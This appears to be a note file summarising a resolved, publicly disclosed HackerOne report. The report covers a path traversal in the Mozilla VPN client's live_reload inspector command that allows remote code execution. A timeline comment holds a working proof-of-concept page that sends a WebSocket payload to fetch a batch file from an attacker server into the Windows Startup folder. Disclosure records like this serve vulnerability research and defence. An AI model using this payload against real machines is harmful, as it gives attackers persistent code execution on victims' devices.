---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/network
substate: "resolved"
weakness: "Path Traversal"
enriched: true
date: 2025-07-29
submitted: 2025-02-15T12:46:43.220Z
bounty_usd: 6000
votes: 173
cve: []
program: "[[programs/mozilla|Mozilla]]"
reporter: "trein"
source: "https://hackerone.com/reports/2995025"
title: "Mozilla VPN Clients: RCE via file write and path traversal"
---
# Mozilla VPN Clients: RCE via file write and path traversal

> **Severity:** High | **Bounty:** 6,000 USD | **Votes:** 173 | **Program:** Mozilla | **Disclosed:** 2025-07-29

- Report: [https://hackerone.com/reports/2995025](https://hackerone.com/reports/2995025)
- CWE: Path Traversal
- Submitted: 2025-02-15T12:46:43.220Z

## Report summary

The report identifies a path traversal vulnerability in Mozilla VPN's client software that leads to Remote Code Execution (RCE). The vulnerability exists in the "live_reload" command of the client's inspector feature, which can be accessed when the client is in developer mode with "Use Staging Servers" enabled. The vulnerable code in the InspectorHotreloader::fetchAndAnnounce() function fails to properly sanitize file paths when downloading remote files to a temporary folder, allowing path traversal via the ".." sequence in Windows file paths. This enables an attacker to write arbitrary files to any location on the filesystem, which can be leveraged to achieve code execution.

## Timeline

- **Report Filed**
- **2025-02-17** @trein: For completeness, an RCE PoC by writing a malicious file to the startup folder of the current user:

1. Host a malicious executable, I used https://ssrf.cvssadvisor.com/ for simplicity. Example:
```
@echo off
calc.exe
```
2. Edit the following html to include your attacker_server, then open it in the browser
```html
<script>
    var ws = new WebSocket('ws://localhost:8765/');
    var attacker_server = "███" // needs to be HTTP, no HTTPS
    
    payload = `live_reload ${attacker_server}/..\\..\\..\\..\\Roaming\\Microsoft\\Windows\\Start%20Menu\\Programs\\Startup\\traversal_poc.bat`

    ws.onopen = function() {
        ws.send(payload); 
    };
    ws.onmessage = function(event) {
        document.getElementById("data").innerText += event.data + "\n";
    };
 </script>
 <h1>Data retrieved:</h1>
 <div id="data"></div>
```

This gives the attacker permanent access to the victim device.

██████████

Regards,
Rein
- **Report Pending Program Review**
- **2025-02-18** @trein: Hey @frida-k, thanks for the update! Side note, in this exploit there is no MOTW (mark of the web) added to the malicious executable. This means that it will run without any warnings.
- **Report Triaged**
- **2025-03-04** @trein: Hey @frida-k,

Do you happen to have an update regarding this report? Happy to help if anything is unclear!
- **2025-03-06** @frida-k: thanks @trein , the team are working on a fix, they plan to remove the HTTP hot loaded in the inspected and add restrictions on the domains which can communicate with the web sockets.
- **Bounty Awarded**
- **2025-03-06** @trein: Thanks for the bounty and update @frida-k!
- **Report Resolved**
- **Agreed On Going Public**
- **2025-07-18** @frida-k: Hello @trein , no problem, I am checking with the team to see if they have concerns or pending work related to the bug. We now have a disclosure schedule and we would disclose the bug July 29th, do you prefer a limited disclosure or are you ok with full disclosure? Thanks.
- **2025-07-18** @trein: Hey @frida-k, happy to do a full disclosure. Thanks!
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
